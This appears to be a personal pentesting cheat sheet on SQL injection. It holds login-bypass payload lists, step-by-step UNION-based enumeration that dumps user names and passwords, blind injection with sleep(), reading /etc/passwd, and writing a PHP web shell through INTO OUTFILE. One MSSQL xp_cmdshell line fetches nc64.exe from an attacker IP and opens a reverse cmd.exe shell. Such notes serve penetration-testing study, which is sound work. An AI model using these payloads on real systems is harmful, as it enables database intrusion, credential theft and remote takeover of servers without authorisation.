CHECK THESE LISTS!
/usr/share/seclists/Fuzzing/Databases/
![[Pasted image 20240102091317.png]]
```c
' or '1'='1  
' or 1=1;-- -
' or 1=1;#  
') or ('x'='x  
' or <column> like '%';--  
' or 1=1 LIMIT 1;--  

rop' or 2=2 #
' or 0=0 ​ --
' or 0=0 #
' or 0=0 #"
' or '1'='1'​ --
' or 1 ​ --'
' or 1=1​ --
' or 1=1 or ''='
' or 1=1 or ""=
' or a=a​ --
' or a=a
') or ('a'='a
'hi' or 'x'='x';
```


Once you find a vulnerable field (log in, password, etc) paste this after opening a simple http server with nc64.exe in it, and another nc -nvlp 4444
```c
'EXEC xp_cmdshell "powershell.exe wget http://192.168.45.213:8000/nc64.exe -OutFile c:\Users\Public\nc.exe" EXEC xp_cmdshell "c:\Users\Public\nc.exe -e cmd.exe 192.168.45.213 4444"--
```

## Sql-injections manually

Sqlmap is good, but it is not very stealthy. And it can generate a lot of traffic. And also it is good to understand the vulnerability in the cote and not just run tools. So let's learn sql-injections the manual way.

The two main ways for perform a sql-injection: **error based** or **blind**.

### Error-bases DB enumeration

If we manage to find an error-message after a broken sql-query, we can use that to try to map out the database structure.

For example, if we have a url that end with

```http
http://example.com/photoalbum.php?id=1
```

#### Step 1 - Add the tick '

So first we should try to break the sql-syntaxt by adding a `'`. We should first ad a `'` or a `"`.

```http
http://example.com/photoalbum.php?id=1'
```

If the page then returns a blank page or a page with a sql-error we know that the page it vulnerable.

#### Step 2 - Enumerate columns

So in order to enumerate the columns of a table we can use the **order by**

**Order by 1** means sort by values of the first column from the result set. **Order by 2** means sort by values of the second column from the result set.

So it is basically just a tool to order the data in a table. But we can use it to find out how many columns a table has. Because if we do **order by 10** when there really only is 9 columns sql will throw an error. And we will know how many columns the table has.

```http
# This trhows no error
http://example.com/photoalbum.php?id=1 order by 9
# This throws error
http://example.com/photoalbum.php?id=1 order by 10
```

So you just increase the number (or do a binary tree search if you want tot do it a bit faster) until you get an error, and you know how many columns the table has.

#### Step 3 - Find space to output db

Now we need to know which coolumns are being outputed on the webpage. It could be that not all data from the database is worthwhile to output, so maybe only column 1 and 3 are being outputted to the website.

To find out which columns are being outputted we can use the **union select** command. So we do the command like this

```http
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,5,6,7,8,9
```

For all the columns that exists. This will return the numbers of the columns that are being outputted on the website. Take note of which these columns are.

#### Step 4 - Start enumerating the database

Now we can use that field to start outputing data. For example if columns number five has been visible in step 3, we can use that to output the data.

Here is a list of data we can retrieve from the database. Some of the syntaxes may difference depending on the database engine (mysql, mssql, postgres).

```http
# Get username of the sql-user
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,user(),6,7,8,9

# Get version
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,version(),6,7,8,9

# Get all tables

http://example.com/photoalbum.php?id=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables

# Get all columns from a specific table

http://example.com/photoalbum.php?id=1 union select 1,2,3,4,column_name,6,7,8,9 from information_schema.columns where table_name = 'users'

# Get content from the users-table. From columns name and password. The 0x3a only servers to create a delimitor between name and password

http://example.com/photoalbum.php?id=1 union select 1,2,3,4,concat(name,0x3a,
password),6,7,8,9 FROM users
```

### Blind sql-injection

We say that it is blind because we do not have access to the error log. This make the whole process a lot more complicated. But it is of course still possible to exploit.

#### Using sleep

Since we do not have access to the logs we do not know if our commands are syntaxically correct or not. To know if it is correct or not we can however use the sleep statement.

```http
http://example.com/photoalbum.php?id=1-sleep(4)
```

If it lods for four seconds exta we know that the database is processing our sleep() command.

### Get shell from sql-injection

The good part about mysql from a hacker-perspective is that you can actaully use slq to write files to the system. The will let us write a backdoor to the system that we can use.

#### Load files

UNION SELECT 1, load_file(/etc/passwd) #

```http
http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
```

#### Write files

```http
http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'

http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
```

#### MSSQL - xp_cmdshell

You can run commands straight from the sql-query in MSSQL.